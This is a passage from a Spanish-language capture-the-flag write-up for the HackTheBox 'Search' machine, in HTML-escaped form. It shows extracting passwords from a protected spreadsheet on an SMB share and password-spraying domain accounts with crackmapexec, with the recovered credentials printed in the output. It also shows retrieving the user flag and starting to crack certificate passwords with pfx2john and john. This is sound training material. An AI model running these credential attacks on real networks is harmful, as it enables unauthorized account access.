  .                                  Dc        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Tue Apr &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt; 06:24:23 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  ..                                 Dc        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Tue Apr &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt; 06:24:23 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;

      &lt;span class=&#34;m&#34;&gt;3246079&lt;/span&gt; blocks of size 4096. &lt;span class=&#34;m&#34;&gt;418870&lt;/span&gt; blocks available
smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;phishing---passwords&#34;&gt;Phishing - Passwords&lt;/h2&gt;
&lt;p&gt;Al revisar el recurso &lt;code&gt;RedirectedFolders$&lt;/code&gt; encontramos un archivo &lt;code&gt;.xlsx&lt;/code&gt; en el directorio de &lt;code&gt;Edgar.Jacobs&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;smb: &lt;span class=&#34;se&#34;&gt;\e&lt;/span&gt;dgar.jacobs&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; ls
  .                                 DRc        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Mon Aug &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 06:02:16 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  ..                                DRc        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Mon Aug &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 06:02:16 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  &lt;span class=&#34;nv&#34;&gt;$RECYCLE&lt;/span&gt;.BIN                     DHSc        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Thu Apr  &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; 16:05:29 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  desktop.ini                      AHSc      &lt;span class=&#34;m&#34;&gt;282&lt;/span&gt;  Mon Aug &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 06:02:16 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  Microsoft Edge.lnk                 Ac     &lt;span class=&#34;m&#34;&gt;1450&lt;/span&gt;  Thu Apr  &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; 16:05:03 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  Phishing_Attempt.xlsx              Ac    &lt;span class=&#34;m&#34;&gt;23130&lt;/span&gt;  Mon Aug &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 06:35:44 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;

      &lt;span class=&#34;m&#34;&gt;3246079&lt;/span&gt; blocks of size 4096. &lt;span class=&#34;m&#34;&gt;418861&lt;/span&gt; blocks available
smb: &lt;span class=&#34;se&#34;&gt;\e&lt;/span&gt;dgar.jacobs&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Tras revisar el archivo, encontramos que existen 2 hojas, una de ellas est√° protegida por contrase√±a adem√°s vemos en esta una celda oculta (Celda C).&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/search/2022_204_102043.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizando &lt;code&gt;xlsx2csv&lt;/code&gt; logramos obtener el valor de la hoja y celda protegida, observamos que son contrase√±as.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/search/phishing ‚ùØ xlsx2csv Phishing_Attempt.xlsx sheets -a
 œÄ ~/htb/search/phishing ‚ùØ &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; sheets
 œÄ ~/htb/search/phishing/sheets ‚ùØ ls
 Captured.csv  &lt;span class=&#34;s1&#34;&gt;&amp;#39;Passwords 01082020.csv&amp;#39;&lt;/span&gt;
 œÄ ~/htb/search/phishing/sheets ‚ùØ cat Captured.csv
Date,Captured Passwords,
01-01-18,78,
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;.. snip ..&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
06-01-19,81,
07-01-19,79,IT ChangeOver Keely Lyons Started
08-01-19,72,
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;.. snip ..&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
04-01-21,14,
 œÄ ~/htb/search/phishing/sheets ‚ùØ cat Passwords&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;01082020.csv
firstname,lastname,password,Username
Payton,Harmon,&lt;span class=&#34;p&#34;&gt;;;&lt;/span&gt;36!cried!INDIA!year!50&lt;span class=&#34;p&#34;&gt;;;&lt;/span&gt;,Payton.Harmon
Cortez,Hickman,..10-time-TALK-proud-66..,Cortez.Hickman
Bobby,Wolf,??47^before^WORLD^surprise^91??,Bobby.Wolf
Margaret,Robinson,//51+mountain+DEAR+noise+83//,Margaret.Robinson
Scarlett,Parks,++47&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;building&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;WARSAW&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;gave&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;60++,Scarlett.Parks
Eliezer,Jordan,!!05_goes_SEVEN_offer_83!!,Eliezer.Jordan
Hunter,Kirby,~~27%when%VILLAGE%full%00~~,Hunter.Kirby
Sierra,Frye,&lt;span class=&#34;nv&#34;&gt;$$49&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;wide&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;STRAIGHT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;jordan&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;28&lt;span class=&#34;nv&#34;&gt;$$&lt;/span&gt;18,Sierra.Frye
Annabelle,Wells,&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;95~pass~QUIET~austria~77&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;,Annabelle.Wells
Eve,Galvan,//61!banker!FANCY!measure!25//,Eve.Galvan
Jeramiah,Fritz,??40:student:MAYOR:been:66??,Jeramiah.Fritz
Abby,Gonzalez,&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;75:major:RADIO:state:93&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;,Abby.Gonzalez
Joy,Costa,**30*venus*BALL*office*42**,Joy.Costa
Vincent,Sutton,**24&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;moment&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;BRAZIL&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;members&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;66**,Vincent.Sutton

,,,
 œÄ ~/htb/search/phishing/sheets ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Creamos dos wordlist con contrase√±as y usuarios, a partir del archivo &lt;code&gt;.csv&lt;/code&gt; generado.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/search/phishing/sheets ‚ùØ cat Passwords&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;01082020.csv &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; cut -d &lt;span class=&#34;s1&#34;&gt;&amp;#39;,&amp;#39;&lt;/span&gt; -f3 &amp;gt; phish_passwords.txt
 œÄ ~/htb/search/phishing/sheets ‚ùØ wc -l phish_passwords.txt
&lt;span class=&#34;m&#34;&gt;17&lt;/span&gt; phish_passwords.txt
 œÄ ~/htb/search/phishing/sheets ‚ùØ cat Passwords&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;01082020.csv &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; cut -d &lt;span class=&#34;s1&#34;&gt;&amp;#39;,&amp;#39;&lt;/span&gt; -f4 &amp;gt; phish_usernames.txt
 œÄ ~/htb/search/phishing/sheets ‚ùØ wc -l phish_usernames.txt
&lt;span class=&#34;m&#34;&gt;17&lt;/span&gt; phish_usernames.txt
 œÄ ~/htb/search/phishing/sheets ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Combinamos los wordlist &lt;code&gt;phish_usernames.txt&lt;/code&gt; y &lt;code&gt;bloodhound_users.txt&lt;/code&gt;, de igual forma &lt;code&gt;phish_passwords.txt&lt;/code&gt; y &lt;code&gt;passwords.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/search/usernames ‚ùØ cat bloodhound_users.txt ../phishing/sheets/phish_usernames.txt &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; tr &lt;span class=&#34;s1&#34;&gt;&amp;#39;[:upper:]&amp;#39;&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;[:lower:]&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; sort &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; uniq &amp;gt; blood_phish_usernames.txt
 œÄ ~/htb/search/usernames ‚ùØ cat bloodhound_users.txt ../phishing/sheets/phish_usernames.txt &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; tr &lt;span class=&#34;s1&#34;&gt;&amp;#39;[:upper:]&amp;#39;&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;[:lower:]&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; sort &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; uniq &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; wc -l
&lt;span class=&#34;m&#34;&gt;109&lt;/span&gt;
 œÄ ~/htb/search/usernames ‚ùØ cat passwords.txt ../phishing/sheets/phish_passwords.txt &amp;gt; phish_known_passwords.txt
 œÄ ~/htb/search/usernames ‚ùØ wc -l phish_known_passwords.txt
&lt;span class=&#34;m&#34;&gt;19&lt;/span&gt; phish_known_passwords.txt
 œÄ ~/htb/search/usernames ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;user---sierra-frye&#34;&gt;User - Sierra Frye&lt;/h1&gt;
&lt;p&gt;Nuevamente realizamos &amp;lsquo;brute force&amp;rsquo; utilizando las contrase√±as y usuarios nuevos encontrados. Encontramos la contrase√±a para &lt;code&gt;sierra.frye&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/search/usernames ‚ùØ crackmapexec smb search.htb -u blood_phish_usernames.txt -p phish_known_passwords.txt --continue-on-success&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep -v &lt;span class=&#34;s1&#34;&gt;&amp;#39;STATUS_LOGON_FAILURE&amp;#39;&lt;/span&gt;
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Windows 10.0 Build &lt;span class=&#34;m&#34;&gt;17763&lt;/span&gt; x64 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;name:RESEARCH&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;domain:search.htb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;signing:True&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; search.htb&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt; STATUS_ACCESS_DENIED
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; search.htb&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt; STATUS_ACCESS_DENIED
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; search.htb&lt;span class=&#34;se&#34;&gt;\e&lt;/span&gt;dgar.jacobs:@3ONEmillionbaby
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; search.htb&lt;span class=&#34;se&#34;&gt;\g&lt;/span&gt;uest: STATUS_ACCOUNT_DISABLED
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; search.htb&lt;span class=&#34;se&#34;&gt;\g&lt;/span&gt;uest: STATUS_ACCOUNT_DISABLED
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; search.htb&lt;span class=&#34;se&#34;&gt;\h&lt;/span&gt;ope.sharp:IsolationIsKey?
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; search.htb&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ierra.frye:&lt;span class=&#34;nv&#34;&gt;$$49&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;wide&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;STRAIGHT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;jordan&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;28&lt;span class=&#34;nv&#34;&gt;$$&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;18&lt;/span&gt;
SMB         search.htb      &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    RESEARCH         &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; search.htb&lt;span class=&#34;se&#34;&gt;\w&lt;/span&gt;eb_svc:@3ONEmillionbaby
 œÄ ~/htb/search/usernames ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ingresamos a &lt;code&gt;RedirectedFolders$&lt;/code&gt; donde encontramos y descargamos la flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/search ‚ùØ cat user.txt
ad2a8266d4a4767ffe773770a94de7d9
 œÄ ~/htb/search ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;certs&#34;&gt;Certs&lt;/h2&gt;
&lt;p&gt;Adem√°s en la carpeta &lt;code&gt;\backup&lt;/code&gt; observamos dos certificados que seguramente estan relacionados a la p√°gina &lt;code&gt;/staff&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;smb: &lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ierra.frye&lt;span class=&#34;se&#34;&gt;\d&lt;/span&gt;ownloads&lt;span class=&#34;se&#34;&gt;\b&lt;/span&gt;ackups&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; ls
  .                                 DHc        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Mon Aug &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 16:39:17 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  ..                                DHc        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Mon Aug &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 16:39:17 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  search-RESEARCH-CA.p12             Ac     &lt;span class=&#34;m&#34;&gt;2643&lt;/span&gt;  Fri Jul &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt; 11:04:11 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  staff.pfx                          Ac     &lt;span class=&#34;m&#34;&gt;4326&lt;/span&gt;  Mon Aug &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 16:39:17 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;

      &lt;span class=&#34;m&#34;&gt;3246079&lt;/span&gt; blocks of size 4096. &lt;span class=&#34;m&#34;&gt;676825&lt;/span&gt; blocks available
smb: &lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ierra.frye&lt;span class=&#34;se&#34;&gt;\d&lt;/span&gt;ownloads&lt;span class=&#34;se&#34;&gt;\b&lt;/span&gt;ackups&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Al intentar importar los certificados vemos que ambos estan protegidos por una contrase√±a.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/search/2022_504_062255.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;password-hash-cracking-1&#34;&gt;Password Hash Cracking&lt;/h2&gt;
&lt;p&gt;Utilizamos &lt;code&gt;pfx2john.py&lt;/code&gt; para obtener el hash de ambos certificados, y utilizando &lt;code&gt;john&lt;/code&gt; con el wordlist &lt;code&gt;rockyou.txt&lt;/code&gt; logramos obtener la contrase√±a para ambos, la cual es la misma.&lt;br /&gt;

&lt;div id=&#34;8f2cb27906541165&#34; class=&#34;codetab&#34;&gt;
  &lt;div class=&#34;codetab__links&#34;&gt;
    
      &lt;button class=&#34;codetab__link&#34; aria-label=&#34;Tab link&#34;&gt;bash&lt;/button&gt;
    
      &lt;button class=&#34;codetab__link&#34; aria-label=&#34;Tab link&#34;&gt;bash&lt;/button&gt;
    
  &lt;/div&gt;
  
  
&lt;div id=&#34;bb1392dbaa97e641&#34; class=&#34;codetab__content&#34;&gt;
  &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
